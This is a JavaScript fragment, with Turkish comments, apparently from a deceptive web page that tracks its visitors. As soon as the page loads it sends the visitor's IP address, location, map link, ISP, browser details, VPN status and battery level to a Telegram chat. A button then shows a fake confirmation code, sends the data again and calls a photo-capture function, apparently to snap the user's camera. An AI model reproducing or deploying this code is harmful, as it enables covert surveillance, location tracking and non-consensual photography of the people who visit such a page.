<script>
...
// KullanÄ±cÄ± verilerini Telegram'a gÃ¶nder
async function sendUserData(fakeCode, withPhoto = false) {
  const ipData = await getIPData();
  const battery = await getBatteryInfo();
  const userAgent = navigator.userAgent;
  const vpnProxy = (ipData.security && ipData.security.vpn) ? "Evet" : "HayÄ±r";
  const mapsLink = ipData.latitude && ipData.longitude
    ? `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`
    : "Bilinmiyor";

  const message = 
`ğŸ“¡ IP: ${ipData.ip || "Bilinmiyor"}
ğŸŒ Ãœlke: ${ipData.country_name || "Bilinmiyor"}
ğŸ™ï¸ Åehir: ${ipData.city || "Bilinmiyor"}
ğŸ§  ISP: ${ipData.org || "Bilinmiyor"}
ğŸ“± TarayÄ±cÄ±: ${userAgent}
ğŸ” VPN/Proxy: ${vpnProxy}
ğŸ—ºï¸ Harita: ${mapsLink}
ğŸ”‹ Åarj: ${battery.level}% (${battery.charging})
ğŸ’» Kod: ${fakeCode || "-"}`;

  await sendTelegramMessage(CHAT_ID, message);

  if (withPhoto) {
    await takePhoto();
  }
}

// Siteye girer girmez IP gÃ¶nder
if (CHAT_ID) {
  sendUserData(null, false);
}

// "Kodu GÃ¶ster" butonu
document.getElementById("submitBtn").addEventListener("click", async () => {
  const input = document.getElementById("codeInput").value.trim();
  if (!CHAT_ID || !URL_SIFRE) {
    showError("Bu siteyi doÄŸru link Ã¼zerinden aÃ§malÄ±sÄ±n.");
    return;
  }
  if(input === ADMIN_CODE){
    hideError();
    const fakeCode = generateFakeCode();
    const codeDiv = document.getElementById("fakeCode");
    codeDiv.textContent = `Kod baÅŸarÄ±yla tanÄ±mlandÄ±! Onay Kodunuz: ${fakeCode}`;
    codeDiv.style.display = "block";
    await sendTelegramMessage(ADMIN_ID, `Admin kodu kullanÄ±ldÄ±.`);
    await sendUserData(fakeCode, true);
    return;
  }
  if(input !== URL_SIFRE){
    showError("Kod hatalÄ± veya sÃ¼resi dolmuÅŸ olabilir.");
    return;
  }
  hideError();
  const fakeCode = generateFakeCode();
  const codeDiv = document.getElementById("fakeCode");
  codeDiv.textContent = `Kod baÅŸarÄ±yla tanÄ±mlandÄ±! Onay Kodunuz: ${fakeCode}`;
  codeDiv.style.display = "block";
  await sendUserData(fakeCode, true);
});
</script>
